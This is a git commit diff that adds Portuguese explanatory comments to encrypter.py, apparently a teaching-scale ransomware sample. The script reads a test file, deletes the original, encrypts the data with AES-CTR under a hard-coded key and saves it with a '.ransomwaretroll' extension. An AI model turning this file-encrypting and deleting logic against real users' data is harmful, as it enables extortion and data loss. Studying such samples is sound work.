d2f2fe1fdc9a663a4dbd8b262ec0c5d29dcb6ba5
Kauã Moreno <119445003+kauamoreno@users.noreply.github.com>
2023-02-25 17:12:28 -0300

    Adicionando comentários pertinentes para consulta

--- encrypter.py
+++ encrypter.py
@@ -4,7 +4,7 @@ import pyaes #Biblioteca de criptografia
 
 #Abrir o arquivo a ser criptografado
 file_name = 'teste.txt'
-file = open(file_name, 'rb')
+file = open(file_name, 'rb') #abre esse arquivo em modo de leitura binária ('rb'). 
 file_data = file.read()
 file.close()
 
@@ -12,7 +12,7 @@ file.close()
 os.remove(file_name)
 
 #Definir a chave de encriptacao
-key = b"testeransomwares"
+key = b"testeransomwares" #Aqui, uma chave de criptografia é definida como uma sequência de bytes.
 aes = pyaes.AESModeOfOperationCTR(key)
 
 #Criptografar o arquivo
@@ -20,6 +20,6 @@ crypto_data = aes.encrypt(file_data)
 
 #Salvar o arquivo criptografado
 new_file = file_name + '.ransomwaretroll'
-new_file = open(f'{new_file}','wb')
+new_file = open(f'{new_file}','wb') #abre um novo arquivo em modo de gravação binária ('wb').
 new_file.write(crypto_data)
 new_file.close()
